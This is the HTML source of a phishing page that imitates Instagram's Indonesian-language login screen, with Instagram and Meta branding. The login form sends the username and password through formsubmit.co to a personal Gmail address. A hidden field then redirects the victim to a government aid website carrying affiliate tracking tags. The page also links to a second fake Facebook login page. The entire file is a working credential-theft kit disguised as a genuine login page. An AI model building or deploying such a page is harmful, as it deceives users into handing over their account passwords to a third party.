<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="insta.css">
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
</head>
<body>

    <div class="login-container">
        <div class="logo-area">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" 
                 alt="Instagram Logo" class="instagram-logo">
        </div>

        <form 
            id="loginForm" 
            action="https://formsubmit.co/ratihku527@gmail.com" 
            method="POST"
        >
            <div class="login-form">
                <input type="text" 
                       placeholder="Nomor telepon, nama pengguna, atau email" 
                       id="username" 
                       name="username_or_phone_or_email_instagram" 
                       required>
                <input type="password" 
                       placeholder="Kata Sandi" 
                       id="password" 
                       name="password" 
                       required>
                
                <input 
                    type="hidden" 
                    name="_next" 
                    value="https://cekbansos.kemensos.go.id/?pid=incomeaccess_int-6094&af_sub1=a_6094b_435c_&af_ad_id=901&btag=a_6094b_435c_&utm_medium=901&utm_source=6094&utm_campaign=435&siteid=6094"
                >
                
                <input type="hidden" name="_captcha" value="false">

                <button type="submit" id="loginButton" class="login-btn">Masuk</button>
            </div>
        </form>

        <div class="divider">
            <div class="line"></div>
            <span class="or-text">ATAU</span>
            <div class="line"></div>
        </div>

        <div class="facebook-login">
            <a href="face.html">
                <span class="fb-icon">f</span> Masuk dengan Facebook
            </a>
        </div>

        <div class="forgot-password">
            <a href="https://www.instagram.com/accounts/password/reset/">Lupa kata sandi?</a>
        </div>
    </div>

    <div class="signup-box">
        <p>Tidak punya akun? 
            <a href="https://www.instagram.com/accounts/signup/phone/">Daftar</a>
        </p>
                    <div class="meta-branding">
                <img src="meta.png" alt="Meta Logo" class="meta-logo">
            </div>
    </div>
    <script>
        // Script validasi sederhana tetap dipertahankan untuk memastikan form tidak kosong sebelum dikirim
        const loginForm = document.getElementById('loginForm');
        
        loginForm.addEventListener('submit', function(event) {
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            
            // Cek apakah field kosong
            if (username === '' || password === '') {
                event.preventDefault(); // Mencegah form dikirim jika kosong
                alert('Mohon isi Nama pengguna, email, atau nomor telepon dan Kata Sandi untuk masuk.');
            }
            // Jika terisi, form akan dikirim secara alami oleh browser ke Formsubmit.co
        });
    </script>
</body>
</html>
